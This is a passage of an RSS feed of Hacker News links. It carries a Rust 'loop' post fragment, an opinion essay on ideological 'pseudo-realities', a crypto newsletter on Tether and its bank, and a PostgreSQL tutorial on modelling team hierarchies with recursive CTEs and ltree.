and the result of <code>loop</code> can be <a href="https://doc.rust-lang.org/stable/reference/expressions/loop-expr.html#break-and-loop-values">assigned to a value</a>?</p>

<p>I did not!</p>

<p>The <a href="https://github.com/rust-lang/rust/issues/1906">issue on the bug tracker</a> appears
to be the only remains of the design discussion around <code>loop</code> in Rust,
though it is insightful to the designers’ original thinking.
The <a href="https://github.com/rust-lang/meeting-minutes/blob/master/weekly-meetings/2012-03-06.md">meeting minutes</a> where it was approved
just say there was consensus to add it.</p>

<div><div><pre><code><span>loop</span> <span>{</span>
    <span>println!</span><span>(</span><span>"Unconditional loops are unconditionally awesome"</span><span>);</span>
<span>}</span>
</code></pre></div></div>

</div></div>]]>
            </description>
            <link>https://brson.github.io/2021/01/17/rust-unconditional-loops</link>
            <guid isPermaLink="false">hacker-news-small-sites-25816502</guid>
            <pubDate>Sun, 17 Jan 2021 23:47:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Psychopathy and the Origins of Totalitarianism]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25816494">thread link</a>) | @458aperta
<br/>
January 17, 2021 | https://newdiscourses.com/2020/12/psychopathy-origins-totalitarianism/ | <a href="https://web.archive.org/web/*/https://newdiscourses.com/2020/12/psychopathy-origins-totalitarianism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">

	
	<div>

		
		
		

				
		
		
		<div>

			
			<div>

				
				<div id="content">

					
	<div id="primary">

		
		<main id="main" role="main">

			
			
				
				<article data-scroll="" id="post-3890">

					
					<div>

						
						<div>

										<section>
						
				</section>
			
							<section>

								<p>Many of the greatest horrors of the history of humanity owe their occurrence solely to the establishment and social enforcement of a false reality. With gratitude to the Catholic philosopher Josef Pieper and his important 1970 essay “Abuse of Language, Abuse of Power” for the term and idea, we can refer to these alternative realities as ideological <em>pseudo-realities</em>.</p>
<p>Pseudo-realities, being false and unreal, will always generate tragedy and evil on a scale that is at least proportional to the reach of their grip on power—which is their chief interest—whether social, cultural, economic, political, or (particularly) a combination of several or all of these. So important to the development and tragedies of societies are these pseudo-realities when they arise and take root that it is worth outlining their basic properties and structure so that they can be identified and properly resisted before they result in sociopolitical calamities—up to and including war, genocide, and even civilizational collapse, all of which can take many millions of lives and can ruin many millions more in the vain pursuit of a fiction whose believers are, or are made, sufficiently intolerant.</p>
<h3 id="the-nature-of-pseudo-realities">The Nature of Pseudo-realities</h3>
<p>Pseudo-realities are, simply put, false constructions of reality. It is hopefully obvious that among the features of pseudo-realities is that they must present a plausible but deliberately wrong understanding of reality. They are cult “realities” in the sense that they are the way that members of cults experience and interpret the world—both social and material—around them. We should immediately recognize that these deliberately incorrect interpretations of reality serve two related functions. First, they are meant to mold the world to accommodate small proportions of people who suffer pathological limitations on their abilities to cope with reality as it is. Second, they are designed to replace all other analyses and motivations with power, which these essentially or functionally psychopathic individuals will contort and deform to their permanent advantage so long as their pseudo-real regime can last.</p>
<p>Pseudo-realities are always social fictions, which, in light of the above, means political fictions. That is, they are maintained not because they are true, in the sense that they correspond to reality, either material or human, but because a sufficient quantity of people in the society they attack either believe them or refuse to challenge them. This implies that pseudo-realities are<em> linguistic phenomena</em> above all else, and where power-granting linguistic distortions are present, it is likely that they are there to create and prop up some pseudo-reality. This also means that they require power, coercion, manipulation, and eventually force to keep them in place. Thus, they are the natural playground of psychopaths, and they are enabled by cowards and rationalizers. Most importantly, pseudo-realities do not attempt to describe reality as it is but rather as it “should be,” as determined by the relatively small fraction of the population who cannot bear living in reality unless it is bent to enable their own psychopathologies, which will be projected upon their enemies, which means all normal people.</p>
<p>Normal people do not accept pseudo-reality and interpret reality more or less accurately, granting the usual biases and limitations of human perspective. Their common heuristic is called<em> common sense</em>, though much more refined forms exist in the uncorrupted sciences. In reality, both of these are handmaidens of power, but in pseudo-realities, this is inverted. In pseudo-reality, common sense is denigrated as bias or some kind of false consciousness, and science is replaced by a scientism that is a tool of power itself. For all his faults and the faults of his philosophy (which enable much ideological pseudo-reality), Michel Foucault warned us about this abuse quite cogently, especially under the labels “biopower” and “biopolitics.” These accusations of bias and false consciousness are, of course, projections of the ideological pseudo-realist, who, by sheer force of rhetoric, transforms limitations on power into applications of power and thus his own applications of power into liberation from it. Foucault, for any insight he provided, is also guilty of this charge.</p>
<p>It must be observed that people who accept pseudo-realities as though they are “real” are no longer normal people. They perceive pseudo-reality in place of reality, and the more thoroughly they take on this delusional position, the more functional psychopathy they necessarily exhibit and thus the less normal they become. Importantly, normal people consistently and consequentially fail to realize this about their reprogrammed neighbors. Perceiving them as normal people when they are not, normal people will reliably misunderstand the motivations of ideological pseudo-realists—power and the universal installation of their own ideology so that everyone lives in a pseudo-reality that enables their pathologies—usually until it is far too late.</p>
<p>As a result of this failure of perspective, many particularly epistemically and morally open normal people will reinterpret the claims of pseudo-reality into something that is plausible in reality under the usual logic and morals that guide our thinking, and this reinterpretation will work to the benefit of the pseudo-realists who have ensnared them. This sort of person, who stands between the real world and the pseudo-real are useful idiots to the ideology, and their role is to generate copious amounts of epistemic and ethical camouflage for the pseudo-realists. This phenomenon is key to the success, spread, and acceptance of pseudo-realities because without it very few people outside of small psychologically, emotionally, or spiritually unwell people would accept a pseudo-reality as if it is a superior characterization of the genuine article. Clearly, the more plausible the account of pseudo-reality on offer, the stronger this effect will be, and the more power the ideologues who believe in it will be able to accrue.</p>
<p>Pseudo-realities may have any degree of plausibility in their distorted descriptions of reality, and thus may recruit different numbers of adherents. They are often said to be accessible only by applying a “theoretical lens,” awakening a specialized “consciousness,” or by means of some pathological form of faith. Whether by “lens,” “consciousness,” or “faith,” these intellectual constructs exist to make the pseudo-reality seem more plausible, to drag people into participating in it against their will, and to distinguish those who “can see,” “are awake,” or “believe” from those who cannot or, as it always eventually goes, <em>will not</em>. That is, they are the pretext to tell people who inhabit reality instead of pseudo-reality that they’re not looking at “reality” correctly, which means as pseudo-reality. This will typically be characterized as a kind of<em> willful ignorance</em> of the pseudo-reality, which will subsequently be described paradoxically as unconsciously maintained. Notice that this puts the burden of epistemic and moral responsibility on the person inhabiting reality, not the person positing its replacement with an absurd pseudo-reality. This is a key functional manipulation of pseudo-realists that must be understood. The ability to recognize this phenomenon when it occurs and to resist it is, at scale, the life and death of civilizations.</p>
<p>Adoption of a pseudo-reality tends to hinge upon a lack of ability or will to question, doubt, and reject them and their fundamental presuppositions and premises of the pseudo-reality. Therefore, the “logical” and “moral” systems that operate within the pseudo-reality will always seek to manufacture this failure wherever they can, and successful pseudo-realist attacks will evolve these features like a social virus until their effectiveness is very high. This deficiency is often the direct result of mental illness, usually paranoia, schizoidia, anxiety, or psychopathy, however, so maintaining and manufacturing these states in themselves and normal people is strongly incentivized by the false “logic” and false “morality” of the ideological pseudo-reality. That is, the methods and means applied in service to a pseudo-reality will create and manipulate psychological weaknesses in people to get them to carry water for a destructive lie. The nicer, more tolerant, and more charitable a community is, supposing it lacks the capacity to spot these counterfeits early on, the more susceptible its members will tend to be to these manipulations.</p>
<h3 id="pseudo-realities-and-power">Pseudo-realities and Power</h3>
<p>The ultimate purpose of creating a pseudo-reality is power, which the constructed pseudo-reality grants in many ways. Though these means are many, we should name a few. First, the pseudo-reality is always constructed such that it structurally advantages those who accept it over those who do not, frequently by overt double standards and through moral-linguistic traps. Double standards in this regard will always favor those who accept pseudo-reality as reality and will always disfavor those who seek the truth. An ideological pseudo-reality must displace reality in a sufficient population to grant itself power to succeed in its goals. Linguistic traps will often employ strategic double meanings of words, often by strategic redefinition (creating a <em>motte and bailey</em>), will beg the question in ways that forces people to participate in the pseudo-reality to respond (often by <em>Aufhebung</em>-style, i.e., Hegelian, dialectical traps), or will begin with an assumption of guilt and demand proof of innocence such that denial or resistance is taken as proof of guilt of some moral crime against the moral system that serves the pseudo-reality (a <em>kafkatrap</em>). Demands will be made with sufficient …</p></section></div></div></article></main></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://newdiscourses.com/2020/12/psychopathy-origins-totalitarianism/">https://newdiscourses.com/2020/12/psychopathy-origins-totalitarianism/</a></em></p>]]>
            </description>
            <link>https://newdiscourses.com/2020/12/psychopathy-origins-totalitarianism/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25816494</guid>
            <pubDate>Sun, 17 Jan 2021 23:46:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[News: Tether’s offshore bank, the Bit Short, NYAG’s document deadline]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25816316">thread link</a>) | @amycastor
<br/>
January 17, 2021 | https://amycastor.com/2021/01/17/news-tethers-offshore-deltec-bank-the-bit-short-nyags-document-deadline-tether-truthers-compare-skeptics-to-qanon/#post-5445 | <a href="https://web.archive.org/web/*/https://amycastor.com/2021/01/17/news-tethers-offshore-deltec-bank-the-bit-short-nyags-document-deadline-tether-truthers-compare-skeptics-to-qanon/#post-5445">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5445">
		<div>
		
<p>Finally, another newsletter! I am trying to find a way to write a crypto newsletter that doesn’t take all day to write. This is a (failed) attempt at that. Going forward, this sporadic newsletter will assume you know a thing or two about the crypto space. (If not, read the articles I link to!)</p>



<p>First some housekeeping—I’ve been working to update my blog and move it over from WordPress.com to WordPress.org. My main challenge is finding a WordPress theme that I like, preferably one that is free.&nbsp;If you have any recommendations, please let me know.</p>



<p>Also, the crap butterfly keyboard on my Macbook Pro is failing me, so I’ve ordered a Mac Air with the M1 chip, which will arrive in a few weeks.&nbsp;I’m hoping it makes my life easier.</p>



<p>If you want to support my work, a reminder that I have a <a href="https://www.patreon.com/amycastor" target="_blank" rel="noreferrer noopener">Patreon account</a>. Think of it as buying me a cup of coffee, a bottle of wine, or a case of wine once a month, depending on what level you subscribe to.&nbsp;&nbsp;</p>



<p>Now, on to the news, starting with Tether. </p>



<h2>Tether conversations reveal things</h2>



<p>I wrote two blog posts recently—these are both transcripts with annotations. If you are interested in Tether and Bitfinex, I recommend you read both, as they contain a lot of good information.&nbsp;&nbsp;</p>



<p>The first is an interview with Tether frontmen <a href="https://amycastor.com/2021/01/14/larry-cermak-and-bennett-tomlin-debate-tethers-solvency-transcript-with-notes/" target="_blank" rel="noreferrer noopener">Stuart Hoegner and Paolo Ardoino</a> hosted by bitcoin maxi Peter McCormack. The point of the interview was clearly to attack the “Tether FUD.”  </p>



<p>Remember, it’s very important that Tether keep up the illusion that real money is behind tethers and all is well in Tetherland. If the charade crumbles, so does Tether’s dollar-peg and along with it, the bitcoin market.</p>



<p>To that end, Hoegner is claiming that the now $24 billion worth of tethers in circulation are fully backed. What a switch. He told us in April 2019—22 billion tethers ago—they were 74% backed. The question is what are they backed with? He won’t tell us. (Deltec is their off-shore bank in the Bahamas, by the way.)&nbsp;</p>



<p><strong>Peter:</strong> You mentioned Deltec. Are you shareholders in the bank?&nbsp;<br><strong>Stuart: </strong>We don’t talk about the investments that we have on the Tether side.<br><strong>Peter:</strong> Okay, so are tethers fully backed?<br><strong>Stuart:</strong> Look. The short answer is yes. Every tether is 100% backed by our reserves. And those reserves include traditional currency and cash equivalents, and may include other assets and receivables from loans made by tether to third parties.&nbsp;</p>



<p>The second <a href="https://amycastor.com/2021/01/14/larry-cermak-and-bennett-tomlin-debate-tethers-solvency-transcript-with-notes/" target="_blank" rel="noreferrer noopener">transcript</a> I wrote up hasn’t gotten as many views but it is also interesting. It’s a debate between The Block’s Larry Cermak and blogger Bennett Tomlin. They argue whether Tether is acting in good faith. Cermak thinks they are. He believes tethers are fully backed—and wants you to believe that, too.</p>



<p>One question we have to ask is why Cermak, who was a staunch Tether skeptic in the past, has suddenly pulled a 180 and joined the campaign to prop up Tether? Assuming good faith, it appears he has fallen for the same con <a href="https://www.bloomberg.com/news/articles/2018-12-18/crypto-mystery-clues-suggest-tether-has-the-billions-it-promised" target="_blank" rel="noreferrer noopener">one Bloomberg reporter</a> did two years ago.</p>



<h2>Questions around Tether’s Deltec Bank </h2>



<p>Another curiosity that sprung up from Paolo and Stu’s interview: Who is Deltec’s banking partner? If Tether keeps its reserves at Deltec and its largest customers have accounts there too, one would think Deltec needs a U.S. bank partner to store USD. In other words, a <a href="https://www.investopedia.com/terms/n/nostroaccount.asp#:~:text=A%20nostro%20account%20refers%20to,foreign%20exchange%20and%20trade%20transactions." target="_blank" rel="noreferrer noopener">nostro account</a> in a foreign bank.&nbsp;</p>



<p>This should not be a secret. When Bitfinex was banking with Noble Bank in Puerto Rico, Noble openly stated on its website that it doesn’t actually hold the money. Instead, <a href="https://www.bloomberg.com/news/articles/2018-05-24/bitfinex-said-to-find-bank-in-puerto-rico-after-wells-fargo-exit" target="_blank" rel="noreferrer noopener">it used&nbsp;BNY Mellon as its custodian</a>. </p>



<p>Presumably, Deltec has a custodian, too. This might explain why the Bahamian Central bank is not reporting inflows that match what Tether claims to have in its reserves. (The central bank publishes a&nbsp;<a rel="noreferrer noopener" href="https://www.centralbankbahamas.com/publications/qsd" target="_blank">quarterly statistical digest</a>&nbsp;that looks at the total assets that all the country’s banks are holding.)</p>



<figure><div>

</div></figure>



<p>Of course, another explanation as to why the country’s central bank isn’t showing a large inflow of funds could be that Tether doesn’t have the reserves it says it does—or else, maybe, a good portion are in BTC?</p>



<p>In a <a href="https://youtu.be/3g2e_nEX9H0?t=426" target="_blank" rel="noreferrer noopener">year-in-review video,</a> Deltec’s CIO Hugo Rogers dropped a bomb. He said, with the straightest face you can imagine, that the bank has a “large position” in bitcoin. </p>



<p>“We bought bitcoin for our clients at about $9,300 so that worked very well through 2020 and we expect it to continue working well in 2021 as the printing presses continue to run hot.” (He is referring to the U.S. printing press, but we know Tether has been running hot, too.) </p>



<p>Hoegner denied that any of those funds were Tether’s, according to <a href="https://www.theblockcrypto.com/linked/91353/deltec-bitcoin-position-tether" target="_blank" rel="noreferrer noopener">The Block.</a></p>



<h2>The Bit Short</h2>



<p>An anonymous blogger published a Medium post on Tether titled <a href="https://crypto-anonymous-2021.medium.com/the-bit-short-inside-cryptos-doomsday-machine-f8dcf78a64d3" target="_blank" rel="noreferrer noopener">“The Bit Short: Inside Crypto’s Doomsday Machine.”</a>  It’s full of great quotes and insights, like this one, describing how Tether’s core moneymaking engine may possibly work:</p>



<ol><li>Bob, a crypto investor, puts $100 of real US dollars into Coinbase.</li><li>Bob then uses those dollars to buy $100 worth of Bitcoin on Coinbase.</li><li>Bob transfers his $100 in Bitcoin to an unbanked exchange, like Bybit.</li><li>Bob begins trading crypto on Bybit, using leverage, and receiving promotional giveaways — all of which are Tether-denominated.</li><li>Tether Ltd. buys Bob’s Bitcoins from him on the exchange, almost certainly through a deniable proxy trading account. Bob gets paid in Tethers.</li><li>Tether Ltd. takes Bob’s Bitcoins and moves them onto a banked exchange like Coinbase.</li><li>Finally, Tether Ltd. sells Bob’s Bitcoins on Coinbase for dollars, and exits the crypto markets.</li></ol>



<p>And this great quote here:</p>



<p>“Forget the activity on the offshore exchanges for a moment, and just think of a simple mental picture. Imagine you could stand at a metaphorical booth, where Coinbase’s exchange connects with the US financial system. If you could do that, you’d see two lines of people at the booth. One line would be crypto investors, putting dollars in—and the other line would be crooks, taking dollars out.”</p>



<p>If you can visualize the image above with Coinbase, you can start to understand why FinCEN is so anxious to push through its <a href="https://public-inspection.federalregister.gov/2020-28437.pdf" target="_blank" rel="noreferrer noopener">proposed “unhosted” wallets rule. </a></p>



<h2>Tether’s document deadline has passed</h2>



<p>Jan. 15 was the deadline for Bitfinex/Tether to submit a trove of documents to the NYAG, which has been investigating them for Martin Act violations. A lot of folks were hoping to see a court filing drop on Friday with the NYAG taking a position on the documents that it has received. The injunction, which limits Bitfinex from dipping into Tether’s reserves, also ended Friday, according to the NYAG’s letter from Dec. 8. </p>



<p>(Update: This is a bit confusing. I am not completely sure if the injunction ended on Jan. 15, according to the NYAG’s December <a href="https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=2AsYgvjJAsSdalpfkInbHA==" target="_blank" rel="noreferrer noopener">letter,</a> or it is implicitly extended until the next court order, <a href="https://twitter.com/ahcastor/status/1350991754330308609" target="_blank" rel="noreferrer noopener">per the original order.)</a> </p>



<p>The NYAG hasn’t filed any new court documents yet, but we are waiting anxiously. Tether says they’ve so far sent 2.5 million docs to the NYAG—I believe that’s called a <a href="https://en.wikipedia.org/wiki/Document_dump" target="_blank" rel="noreferrer noopener">document dump.</a></p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Sorry to break this to FUD spreaders. Tether and Bitfinex produced more than 2.5M documentation pages in response to requests from NYAG. Discussions are progressing well. Business as usual after the 15th of Jan. <a href="https://t.co/VoEsRuJyyP">https://t.co/VoEsRuJyyP</a></p>— Paolo Ardoino (@paoloardoino) <a href="https://twitter.com/paoloardoino/status/1348283355041853440?ref_src=twsrc%5Etfw">January 10, 2021</a></blockquote></div>
</div></figure>



<p>In the meantime, Tether has mysteriously stopped printing tethers. The last big print was <a href="https://twitter.com/whale_alert/status/1349038029546156034" target="_blank" rel="noreferrer noopener">400 million tethers on Jan. 12</a>, and prior to that, <a href="https://twitter.com/whale_alert/status/1347896030185009154" target="_blank" rel="noreferrer noopener">400 million on Jan. 9</a>, according to @whale_alert.  </p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">I'd like to help all Tether FUD deniers who are announcing they've proven the FUDsters wrong, by listing the actual FUD items, so that they can base their denying on something. The "it's been proven many times before so I won't detail it here" seriously lacks entertainment value.</p>— Trolly McTrollface (@Tr0llyTr0llFace) <a href="https://twitter.com/Tr0llyTr0llFace/status/1350895370344288256?ref_src=twsrc%5Etfw">January 17, 2021</a></blockquote></div>
</div></figure>



<h2>Understanding GBTC</h2>



<p>There has been some confusion on Twitter as to how Grayscale Bitcoin Trust (GBTC) works. Grayscale doesn’t buy bitcoin directly. Grayscale customers send Grayscale their bitcoin—or cash to buy bitcoin with—and Grayscale issues shares in return. But why do the shares consistently trade at a premium to net asset value? </p>



<p>This <a href="https://adventuresincapitalism.com/2020/11/24/why-this-reflexive-ponzi-scheme-will-continue/" target="_blank" rel="noreferrer noopener">November 2020 article</a> by investor Harris Kupperman explains it well. “Think of GBTC as Pac-Man. The coins go in, but do not go out,” he said, going on to describe how GBTC functions as a “reflexive Ponzi scheme.”</p>



<h2>Coinlab cuts a deal with Mt Gox creditors</h2>



<p>Coinlab, a former U.S. company that has a $16 billion claim against Mt. Gox, has proposed a deal with Mt. Gox creditors over their claims. If creditors choose to go forward with the deal, they can agree to get back 90% of their BTC ahead of the settlement, according to <a href="https://www.bloomberg.com/news/articles/2021-01-15/coinlab-reaches-deal-with-mt-gox-trustee-over-bitcoin-claims" target="_blank" rel="noreferrer noopener">Bloomberg.</a></p>



<p>Kim Nilsson of WizSec says Coinlab was never acting in good faith. “CoinLab was insisting on continuing to hold up the process for everyone while they litigate to try to steal everyone’s money, and had to be essentially bribed so as not to obstruct this arrangement.” <a href="https://blog.wizsec.jp/2021/01/earlier-mtgox-payouts-coinlab.html" target="_blank" rel="noreferrer noopener">(WizSec blog)</a></p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">I am positive that every Mt Gox creditor will happily agree to a 10% haircut on their settlement if it means CoinLab can claw back millions of dollars in Bitcoin</p>— Kyle S. Gibson (@KyleSGibson) <a href="https://twitter.com/KyleSGibson/status/1350146151916433409?ref_src=twsrc%5Etfw">January 15, 2021</a></blockquote></div>
</div></figure>



<h2>Other notable news</h2>



<p>FinCEN has extended the deadline for comments on its proposed crypto wallet rule. Starting from Jan. 15, you now have 15 days to comment on reporting requirements, and 45 days to comment on proposed rules for reporting counterparty information and record-keeping requirements. <a rel="noreferrer noopener" href="https://www.coindesk.com/fincen-extends-comment-period-for-controversial-crypto-wallet-rule-by-15-days" target="_blank">(Coindesk</a>, <a rel="noreferrer noopener" href="http://reopened%20for%2015%20days%20for%20comments%20on%20the%20proposed%20reporting%20requirements%20and%20for%2045%20days%20for%20comments%20on%20the%20proposed%20requirement%20to%20report%20counterparty%20information%20and%20the%20proposed%20recordkeeping%20requirements./" target="_blank">FinCEN notice)</a></p>



<p>Good-bye and good riddance. Brian Brooks has stepped down as acting commissioner of the OCC. <a href="https://www.coindesk.com/occ-chief-brian-brooks-is-stepping-down-thursday" target="_blank" rel="noreferrer noopener">(Coindesk.)</a> The former Coinbase exec recently posted an editorial in the Financial Times shilling DeFi. (<a href="https://www.ft.com/content/c1caca5b-01f7-41be-85a4-3ecb883f2417" target="_blank" rel="noreferrer noopener">FT</a>, paywalled)</p>



<p>The European Central Bank calls for regulating Bitcoin’s “funny business.” (<a href="https://reut.rs/2LLb5GK" target="_blank" rel="noreferrer noopener">Reuters</a>)</p>



<p>Gary Gensler is reportedly President-elect Joe Biden’s choice to lead the SEC. Gensler is a crypto savvy guy, who taught a course on blockchain at MIT …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://amycastor.com/2021/01/17/news-tethers-offshore-deltec-bank-the-bit-short-nyags-document-deadline-tether-truthers-compare-skeptics-to-qanon/#post-5445">https://amycastor.com/2021/01/17/news-tethers-offshore-deltec-bank-the-bit-short-nyags-document-deadline-tether-truthers-compare-skeptics-to-qanon/#post-5445</a></em></p>]]>
            </description>
            <link>https://amycastor.com/2021/01/17/news-tethers-offshore-deltec-bank-the-bit-short-nyags-document-deadline-tether-truthers-compare-skeptics-to-qanon/#post-5445</link>
            <guid isPermaLink="false">hacker-news-small-sites-25816316</guid>
            <pubDate>Sun, 17 Jan 2021 23:21:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hierarchical Structures in PostgreSQL]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25815370">thread link</a>) | @alex_hirner
<br/>
January 17, 2021 | https://hoverbear.org/blog/postgresql-hierarchical-structures | <a href="https://web.archive.org/web/*/https://hoverbear.org/blog/postgresql-hierarchical-structures">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <article>
                
    <nav id="toc">
        <ol>
            
            <li>
                <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#core-problem">Core Problem</a>
                
            </li>
            
            <li>
                <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#concepts">Concepts</a>
                
            </li>
            
            <li>
                <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#before-we-start">Before we start</a>
                
            </li>
            
            <li>
                <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#solution-1-materialized-views-and-recursive-ctes">Solution 1: Materialized Views and Recursive CTEs</a>
                
                <ol>
                    
                    <li>
                        <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#testing">Testing</a>
                    </li>
                    
                </ol>
                
            </li>
            
            <li>
                <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#solution-2-ltree-columns">Solution 2: ltree columns</a>
                
                <ol>
                    
                    <li>
                        <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#testing-1">Testing</a>
                    </li>
                    
                </ol>
                
            </li>
            
            <li>
                <a href="https://hoverbear.org/blog/postgresql-hierarchical-structures/#conclusion">Conclusion</a>
                
            </li>
            
        </ol>
    </nav>

                
    <p>It's a common pattern: a database developer at a startup is probably on the Product subteam of the Engineering team at their company. In a department store, shoes are a subcategory of clothing, while your favorite thermos is probably in the travel department.</p>
<p>In any Github organization, there are teams within teams within teams. In any large department store there are categories deeply nested. In any recipe book, there are many ways to classify food.</p>
<p>So how can we model them?</p>
<span id="continue-reading"></span>
<p>Jake (my boyfriend) and I have been exploring relational database concepts out of interest and pure geekery. This was a fun problem that I gave him and we got to work it out together. It was so fun we wanted to share! We won't beat the bush around with PostgreSQL installation, security, setup, blah blah at this time, let's just have some pure database fun for a few minutes!</p>
<h2 id="core-problem">Core Problem</h2>
<p>Handle a high amount of reads and a small amount of writes over a small to medium amount of keys (in this case, a text field), each of which <em>possibly</em> has a reference to a parent key.</p>
<p>In this concrete example, we will replicate team structures. Start with the teams existing inside some small organization, each with a <code>name</code> and possibly a <code>parent</code>:</p>
<table><thead><tr><th>name</th><th>parent</th></tr></thead><tbody>
<tr><td>Engineering</td><td>NULL</td></tr>
<tr><td>Geschäftstätigkeit</td><td>Engineering</td></tr>
<tr><td>Product</td><td>Engineering</td></tr>
<tr><td>Interns</td><td>Product</td></tr>
<tr><td>Administration</td><td>NULL</td></tr>
<tr><td>Human Resources</td><td>Administration</td></tr>
<tr><td>Finance</td><td>Administration</td></tr>
<tr><td>Marketing</td><td>NULL</td></tr>
<tr><td>Logistics</td><td>NULL</td></tr>
<tr><td>国际化</td><td>NULL</td></tr>
</tbody></table>
<p>Then somehow mixin the <code>path</code> which shows the datum's place in the hierarchy.</p>
<table><thead><tr><th>name</th><th>parent</th><th>path</th></tr></thead><tbody>
<tr><td>Administration</td><td>NULL</td><td>{Administration}</td></tr>
<tr><td>Finance</td><td>Administration</td><td>{Administration,Finance}</td></tr>
<tr><td>Human Resources</td><td>Administration</td><td>{Administration,Human Resources}</td></tr>
<tr><td>Engineering</td><td>NULL</td><td>{Engineering}</td></tr>
<tr><td>Geschäftstätigkeit</td><td>Engineering</td><td>{Engineering,Geschäftstätigkeit}</td></tr>
<tr><td>Product</td><td>Engineering</td><td>{Engineering,Product}</td></tr>
<tr><td>Interns</td><td>Product</td><td>{Engineering,Product,Interns}</td></tr>
<tr><td>Logistics</td><td>NULL</td><td>{Logistics}</td></tr>
<tr><td>Marketing</td><td>NULL</td><td>{Marketing}</td></tr>
<tr><td>国际化</td><td>NULL</td><td>{国际化}</td></tr>
</tbody></table>
<p>For this exercise, the exact format of the <code>path</code> is not important. An HTML string, a comma separated list, or any ordered collection is acceptable.</p>
<h2 id="concepts">Concepts</h2>
<p>We'll actually cover two solutions, both of which demonstrate a few core concepts! </p>
<p>For the first solution, ensure you're familiar with the ideas of <a href="https://www.postgresql.org/docs/current/functions-comparison.html"><strong><code>NULL</code></strong></a>, <a href="https://www.postgresql.org/docs/current/ddl-constraints.html#DDL-CONSTRAINTS-PRIMARY-KEYS"><strong>Primary Keys</strong></a>, and <a href="https://www.postgresql.org/docs/current/ddl-constraints.html#DDL-CONSTRAINTS-FK"><strong>Foreign Keys</strong></a>. We'll need these for building safe, efficient linking between teams and their parents.</p>
<p>We'll then use a <a href="https://www.postgresql.org/docs/12/sql-creatematerializedview.html"><strong>Materialized View</strong></a> to create a sort of <em>cache</em> of the point-in-time team structure. We'll refresh this using a <a href="https://www.postgresql.org/docs/12/plpgsql-trigger.html"><strong>Function</strong></a> that is <a href="https://www.postgresql.org/docs/12/trigger-definition.html"><strong>Triggered</strong></a> whenever the original table is written to.</p>
<p>For the next solution, we'll explore the tailor-made <a href="https://www.postgresql.org/docs/12/ltree.html"><strong><code>ltree</code></strong></a> type that can solve our needs without the complex mechanics of the first solution. Further, this solution offers some useful functionality like <code>subpath</code>s.</p>
<h2 id="before-we-start">Before we start</h2>
<p>Please make sure your database is in UTF-8! We're going to be exploring international text today. If you're not sure, let's create a new empty database, and go ahead and connect to it.</p>
<pre><code data-lang="sql"><span>CREATE DATABASE </span><span>organization WITH ENCODING 'UTF8' </span><span>TEMPLATE</span><span>=template0
</span></code></pre><h2 id="solution-1-materialized-views-and-recursive-ctes">Solution 1: Materialized Views and Recursive CTEs</h2>
<pre><code data-lang="sql"><span>CREATE TABLE </span><span>teams</span><span> (
    name   </span><span>TEXT
</span><span>           UNIQUE NOT </span><span>NULL
           </span><span>PRIMARY KEY</span><span>,
    parent </span><span>TEXT
           REFERENCES</span><span> teams (name)
);

CREATE MATERIALIZED VIEW team_structure AS
    </span><span>WITH</span><span> RECURSIVE teams_cte(name, parent, </span><span>path</span><span>) AS (
        </span><span>SELECT </span><span>teams</span><span>.</span><span>name</span><span>, </span><span>teams</span><span>.</span><span>parent</span><span>, ARRAY [</span><span>teams</span><span>.</span><span>name</span><span>]
            </span><span>FROM</span><span> teams
            </span><span>WHERE </span><span>teams</span><span>.</span><span>parent </span><span>IS </span><span>NULL
        </span><span>UNION ALL
        SELECT </span><span>teams</span><span>.</span><span>name</span><span>, </span><span>teams</span><span>.</span><span>parent</span><span>, array_append(</span><span>teams_cte</span><span>.</span><span>path</span><span>, </span><span>teams</span><span>.</span><span>name</span><span>)
            </span><span>FROM</span><span> teams_cte,
                 teams
            </span><span>WHERE </span><span>teams</span><span>.</span><span>parent </span><span>= </span><span>teams_cte</span><span>.</span><span>name
</span><span>    )
    </span><span>SELECT </span><span>*
        </span><span>FROM</span><span> teams_cte;

</span><span>CREATE FUNCTION </span><span>refresh_team_structure</span><span>() RETURNS TRIGGER
    LANGUAGE plpgsql AS
$$
</span><span>BEGIN
</span><span>    REFRESH MATERIALIZED VIEW team_structure;
    RETURN new;
</span><span>END</span><span>;
$$;

</span><span>CREATE TRIGGER </span><span>trigger_update_team_structure
</span><span>    AFTER </span><span>UPDATE </span><span>OR </span><span>INSERT </span><span>OR </span><span>DELETE </span><span>OR </span><span>TRUNCATE
</span><span>    ON teams
EXECUTE PROCEDURE refresh_team_structure();
</span></code></pre><h3 id="testing">Testing</h3>
<p>Loading the example data, including a few complex cases, like spaces, umlauts, and Chinese script:</p>
<pre><code data-lang="sql"><span>INSERT INTO</span><span> teams (name, parent)
    </span><span>VALUES</span><span> ('</span><span>Engineering</span><span>', </span><span>NULL</span><span>),
           ('</span><span>Geschäftstätigkeit</span><span>', '</span><span>Engineering</span><span>'),
           ('</span><span>Product</span><span>', '</span><span>Engineering</span><span>'),
